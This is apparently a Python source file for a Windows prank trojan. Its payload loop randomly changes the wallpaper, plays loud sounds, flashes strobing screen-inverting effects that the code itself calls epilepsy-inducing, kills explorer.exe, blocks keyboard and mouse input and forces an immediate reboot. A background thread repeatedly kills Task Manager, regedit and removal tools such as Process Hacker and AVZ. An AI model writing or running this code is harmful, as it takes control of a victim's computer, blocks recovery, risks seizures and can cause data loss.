import customtkinter
from PIL import Image
import os
import threading
import time
import pygame
import win32con
import win32gui
import win32api
import math
import ctypes
import random

pygame.mixer.init()
pygame.init()
assets = r'C:\Windows\System32\Shell'

def man_i_love_epilepsy():
	user32 = ctypes.windll.user32
	user32.SetProcessDPIAware()
	[sw, sh] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)] 
	for i in range(10):
		hdc = win32gui.GetDC(0)
		color = (random.randint(0, 122), random.randint(0, 430), random.randint(0, 310))
		brush = win32gui.CreateSolidBrush(win32api.RGB(*color))
		win32gui.SelectObject(hdc, brush)
		win32gui.BitBlt(hdc, random.randint(-10, 10), random.randint(-10, 10), sw, sh, hdc, 0, 0, win32con.SRCCOPY)
		win32gui.BitBlt(hdc, random.randint(-10, 10), random.randint(-10, 10), sw, sh, hdc, 0, 0, win32con.PATINVERT)
	
	rng_thread = threading.Thread(target=rng_payload)
	rng_thread.run() # i have to run it again (when triggers old thread stops)


def cherry_window():
	
	ctypes.windll.user32.SystemParametersInfoW(0x0014, 0, os.path.join(assets, 'cherry.jpg'), 0x0001 | 0x0002)
	pygame.mixer.music.load(os.path.join(assets, 'cherry.mp3'))
	pygame.mixer.music.play(2)
	time.sleep(3)
	rng_thread = threading.Thread(target=rng_payload)
	rng_thread.run()

def horse():
	ctypes.windll.user32.SystemParametersInfoW(0x0014, 0, os.path.join(assets, 'horse.png'), 0x0001 | 0x0002)
	rng_thread = threading.Thread(target=rng_payload)
	rng_thread.run()


def ear_destruction():
	pygame.mixer.music.load(os.path.join(assets, 'hueuh.mp3'))
	pygame.mixer.music.play(1)
	rng_thread = threading.Thread(target=rng_payload)
	rng_thread.run() # i have to run it again (when triggers old thread stops)

def trigger_crash():
		pygame.mixer.music.load('assets/scream.mp3')
		pygame.mixer.music.play()

		# Code from https://github.com/Leo-Aqua/Python-gdi-repo
		user32 = ctypes.windll.user32
		user32.SetProcessDPIAware()
		[sw, sh] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)] 
		hdc = win32gui.GetDC(0)
		dx = dy = 1
		angle = 0
		size = 1
		speed = 5
		ctypes.windll.user32.BlockInput(True)
		for i in range(10):
			win32gui.BitBlt(hdc, 0, 0, sw, sh, hdc, dx,dy, win32con.SRCAND)
			dx = math.ceil(math.sin(angle) * size * 10)
			dy = math.ceil(math.cos(angle) * size * 10)
			angle += speed / 10
			if angle > math.pi :
				angle = math.pi * -1

		os.system('shutdown /r /t 0 /f')

def blocked_apps():
	while True:
		time.sleep(5)
		os.system('tasklist | findstr /i "mmc.exe" && taskkill /f /im mmc.exe')
		os.system('tasklist | findstr /i "Taskmgr.exe" && taskkill /f /im Taskmgr.exe')
		os.system('tasklist | findstr /i "regedit.exe" && taskkill /f /im regedit.exe')
		
		# Trying to block MHelper (please god just work) and apps like Process Hacker, RegAlyzer, etc. (basically blocking nedohackers' tools)
		os.system('tasklist | findstr /i "MHelper_full.exe" && taskkill /f /im MHelper_full.exe')
		os.system('tasklist | findstr /i "ProcessHacker.exe" && taskkill /f /im ProcessHacker.exe')
		os.system('tasklist | findstr /i "RegAlyzer.exe" && taskkill /f /im RegAlyzer.exe')
		os.system('tasklist | findstr /i "SU.exe" && taskkill /f /im SU.exe')
		os.system('tasklist | findstr /i "avz.exe" && taskkill /f /im avz.exe')
		os.system('tasklist | findstr /i "CCleaner.exe" && taskkill /f /im CCleaner.exe') # idk whats the real name
		os.system('tasklist | findstr /i "CCleaner64.exe" && taskkill /f /im CCleaner64.exe') # idk whats the real name
		os.system('tasklist | findstr /i "Explorer++.exe" && taskkill /f /im Explorer++.exe')

def rng_payload():
	cherry_thread = threading.Thread(target=cherry_window)
	ear_thread = threading.Thread(target=ear_destruction)
	crash_thread = threading.Thread(target=trigger_crash)
	epilepsy_thread = threading.Thread(target=man_i_love_epilepsy)
	horse_thread = threading.Thread(target=horse)

	while True:
		time.sleep(15)
		num = random.randint(0, 10)
		print(num)
		match num:
			case 0:
				crash_thread.run() # show crash effects and restart
			case 1:
				os.system('taskkill /f /im explorer.exe') # self-explanitory 
			case 2:
				ear_thread.run() # plays hueuh.mp3
			case 3:
				epilepsy_thread.run() # man i love epilepsy
			case 4:
				horse_thread.run()
			case 5:
				cherry_thread.run() # plays cherry.mp3
		

block_apps_thread = threading.Thread(target=blocked_apps)
block_apps_thread.start()

rng_thread = threading.Thread(target=rng_payload)
rng_thread.run()
